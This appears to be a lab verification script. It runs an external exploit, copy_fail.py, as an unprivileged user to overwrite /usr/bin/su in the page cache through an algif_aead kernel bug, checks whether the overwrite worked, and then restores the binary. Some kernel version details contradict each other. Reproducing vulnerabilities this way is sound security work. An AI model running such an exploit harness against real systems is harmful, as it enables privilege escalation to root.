#!/usr/bin/env bash

: <<'EOF'
verify.sh — run inside the Lima VM as root after provision.sh + reboot

Checks:
	1. Confirms we are on the vulnerable kernel (6.1.162-1).
	2. Confirms algif_aead is loadable (not blocked by modprobe).
	3. Runs copy_fail.py as an unprivileged user.
	4. Reports whether the page cache overwrite succeeded.
	5. Confirms the patched kernel (6.1.170-1) blocks the attack.
EOF

set -euo pipefail

VULN_KERNEL="6.1.0-43-cloud-amd64"
EXPLOIT_USER="nobody"

RED='\033[0;31m'
GRN='\033[0;32m'
YLW='\033[1;33m'
RST='\033[0m'

pass() { echo -e "${GRN}[PASS]${RST} $*"; }
fail() { echo -e "${RED}[FAIL]${RST} $*"; }
info() { echo -e "${YLW}[INFO]${RST} $*"; }

RUNNING=$(uname -r)
info "Running kernel: ${RUNNING}"

if [[ "${RUNNING}" == "${VULN_KERNEL}" ]]; then
    pass "Vulnerable kernel confirmed: ${RUNNING}"
else
    fail "Expected ${VULN_KERNEL}, got ${RUNNING}"
    echo "     Did you reboot after provision.sh? Check GRUB with: grep GRUB_DEFAULT /etc/default/grub"
    exit 1
fi

info "Checking algif_aead..."
if python3 - <<'PYCHECK'
import socket, struct
AF_ALG = 38
s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
sa = struct.pack("H14sII64s", AF_ALG, b"aead", 0, 0, b"gcm(aes)")
s.bind(sa)
s.close()
print("algif_aead: bind succeeded")
PYCHECK
then
    pass "algif_aead is available (AF_ALG bind succeeded)"
else
    fail "algif_aead bind failed — module may be blocked or kernel lacks support"
    exit 1
fi

info "Recording /usr/bin/su ELF magic before exploit..."
MAGIC_BEFORE=$(python3 -c "
with open('/usr/bin/su','rb') as f:
    print(f.read(4).hex())
")
info "Magic before: ${MAGIC_BEFORE}"

EXPLOIT_BIN="/usr/local/bin/copy_fail.py"
if [[ ! -f "${EXPLOIT_BIN}" ]]; then
    EXPLOIT_BIN="$(dirname "$0")/copy_fail.py"
fi

info "Running exploit as ${EXPLOIT_USER}..."
su -s /bin/bash "${EXPLOIT_USER}" -c "python3 ${EXPLOIT_BIN} --target /usr/bin/su" || true

info "Dropping page cache..."
echo 1 > /proc/sys/vm/drop_caches
sleep 1

MAGIC_AFTER=$(python3 -c "
with open('/usr/bin/su','rb') as f:
    print(f.read(4).hex())
")
info "Magic after : ${MAGIC_AFTER}"

if [[ "${MAGIC_AFTER}" == "7f454c46" ]]; then
    fail "Page cache unchanged — ELF magic intact. Exploit did not fire."
    echo "     Possible reasons:"
    echo "       - Kernel is already patched (check: dpkg -l linux-image-\$(uname -r))"
    echo "       - algif_aead copy-on-write fix is backported"
    echo "       - Payload offset mismatch for this su binary"
elif [[ "${MAGIC_AFTER}" != "${MAGIC_BEFORE}" ]]; then
    pass "Page cache overwritten! Magic changed: ${MAGIC_BEFORE} -> ${MAGIC_AFTER}"
    pass "CVE-2026-31431 reproduced successfully."
else
    fail "Magic unchanged but not ELF — unexpected state: ${MAGIC_AFTER}"
fi

info "Restoring /usr/bin/su from package..."
apt-get install -y --reinstall login 2>/dev/null || true

MAGIC_RESTORED=$(python3 -c "
with open('/usr/bin/su','rb') as f:
    print(f.read(4).hex())
")
if [[ "${MAGIC_RESTORED}" == "7f454c46" ]]; then
    pass "/usr/bin/su restored (ELF magic: ${MAGIC_RESTORED})"
else
    fail "Restore may have failed — magic: ${MAGIC_RESTORED}"
fi

echo ""
info "Done. To test the patched kernel:"
echo "  1. apt-get install linux-image-\$(uname -r | sed 's/43/45/') (or the patched version)"
echo "  2. Update GRUB, reboot, re-run verify.sh"
echo "  3. Expect [FAIL] on step 5 — page cache should remain intact"
